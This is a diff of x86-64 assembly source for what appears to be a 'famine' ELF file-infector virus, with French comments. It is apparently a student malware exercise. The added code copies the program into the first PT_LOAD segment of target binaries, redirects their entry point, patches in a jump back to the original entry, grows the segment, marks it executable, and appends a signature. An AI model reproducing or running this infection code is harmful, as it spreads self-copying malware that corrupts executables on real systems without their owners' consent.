@@ -2,7 +2,7 @@
 %define JMP_OFFSET  jump - main
 %define SIGNATURE_SIZE _end - signature
 %define O_RDWR      2
-%define O_DIRECTORY 0200000
+%define O_APPEND	02000
 %define SEEK_END    2
 %define PROT_READ   1
 %define PROT_WRITE  2
@@ -10,6 +10,7 @@
 %define PT_LOAD	    1
 %define PF_X        1
 
+%define SYS_WRITE   1
 %define SYS_OPEN    2
 %define SYS_CLOSE   3
 %define SYS_LSEEK   8
@@ -54,6 +55,10 @@ struc famine
     oldEntry:   resq 1
 endstruc
 
+ ;   lea r15, [rel jump + 1]
+ ;   cmp byte [r15], 0x90                ; cette ligne permet de quiter le code une fois qu'il a été infecter
+ ;   jnz close_mmap
+
 section .text
 
 global main
@@ -75,9 +80,15 @@ main:
 exit:
     mov rdi, 1
     lea rsi, [rel signature]
-    mov rdx, 49
-    mov rax, 1
+    mov rdx, SIGNATURE_SIZE
+    mov rax, SYS_WRITE
     syscall
+    mov qword [rsp + pload], 0
+;    mov qword [rsp + fd], 0
+;    mov qword [rsp + fileData], 0
+;    mov qword [rsp + fileSize], 0
+;    mov qword [rsp + entry], 0
+;    mov qword [rsp + oldEntry], 0
     pop rsi
     pop rdi
     pop rcx
@@ -110,7 +121,7 @@ get_file_data:
     mov rax, SYS_LSEEK
     syscall             ; lseek(fd, 0, SEEK_END)
     cmp rax, 0          ; if (!size) return ;
-    jz close_file
+    jz close_file                                                                                                    ;faire un check si le fichier est pas assez grand et le passer dans la fonction append_signature
     mov [r12 + fileSize], rax
     xor rdi, rdi
     mov rsi, [r12 + fileSize]
@@ -165,29 +176,36 @@ phead_loop:
     add rsi, rdx
     cmp r14, rdi
     jl phead_loop
-    jmp close_mmap                    ;on quite si il y a pas de pload trouvé
-first_pload_found:
+    jmp close_mmap                    ;on quite si il n'y a pas de pload trouvé
+first_pload_found:                                                                                              ; faire un check pour voir si on a la place d'écrire 
     add r13, rsi
     mov [r12 + pload], r13
-    mov rdi, [r13 + p_vaddr]
+    mov rdi, [r13 + p_vaddr]             ; met l'entry a la fin du premier pload = p_vaddr + p_memsz
     add rdi, [r13 + p_memsz]
     mov [r12 + entry], rdi
-    mov rsi, [r12 + fileData]
+    mov rsi, [r12 + fileData]           ; écrit la nouvelle entry dans l'executable
     mov [rsi + e_entry], rdi
 copy_program:
-    mov rdi, [r12 + fileData]
+    mov rdi, [r12 + fileData]               ; address a la fin du premier pload
     add rdi, [r13 + p_filesz]
-    lea rsi, [rel main]
-    mov rdx, PROG_SIZE
+    lea rsi, [rel main]                     ; address du debut du programe
+    mov rdx, PROG_SIZE                      ; taille du programe
     call ft_memcpy
+    
+    ; calcule le jump qu'il faut faire pour attendre l'entry normale 
     mov rdx, [r12 + entry]
     add rdx, JMP_OFFSET + 5
     mov rcx, [r12 + oldEntry]
     sub ecx, edx
+    
+    ; ecrit le jump a l'adress de jump
     mov [rdi + JMP_OFFSET], byte 0xE9 ; 0xe9 = jmp
     mov [rdi + JMP_OFFSET + 1], ecx
+
+    ; augmente la taille du premier pload
     add qword [r13 + p_memsz], PROG_SIZE
     add qword [r13 + p_filesz], PROG_SIZE
+    
     or dword [r13 + p_flags], PF_X           ; ajoute les droit d'execution
     
 close_mmap:
@@ -217,7 +235,7 @@ ft_memcpy:
     mov rax, rdi
     ret
 
-;  void *ft_strcmp(char *str1, char* str2)
+;  char ft_strcmp(char *str1, char* str2)
 ft_strcmp:
     xor rax, rax
     xor rbx, rbx
@@ -235,6 +253,20 @@ ft_strcmp:
     mov bl, [rdi + rax]
     sub bl, [rsi + rax]
     mov rax, rbx
+    ret
+
+;  void append_signature(char *name)
+append_signature:
+    mov rsi, O_RDWR | O_APPEND
+    mov rax, SYS_OPEN
+    syscall
+    mov rdi, rax 
+    lea rsi, [rel signature]
+    mov rdx, SIGNATURE_SIZE
+    mov rax, SYS_WRITE
+    syscall
+    mov rax, SYS_CLOSE
+    syscall
     ret
 
 
